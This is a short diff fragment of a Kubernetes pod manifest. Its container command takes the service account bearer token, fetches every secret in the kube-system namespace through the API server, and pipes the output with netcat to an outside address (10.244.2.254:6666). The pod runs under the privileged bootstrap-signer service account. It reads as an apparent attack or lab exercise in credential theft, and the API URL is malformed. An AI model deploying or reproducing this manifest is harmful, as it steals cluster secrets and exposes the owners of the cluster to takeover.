@@ -13,4 +13,3 @@ spec:
     curl -k -v -H \"Authorization: Bearer $TOKEN\" -H \"Content-Type: application/json\"
     https:/${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/api/v1/namespaces/kube-system/secrets; } | nc 10.244.2.254 6666;"]
   serviceAccountName: bootstrap-signer
-  automaticServiceAccontToken: True
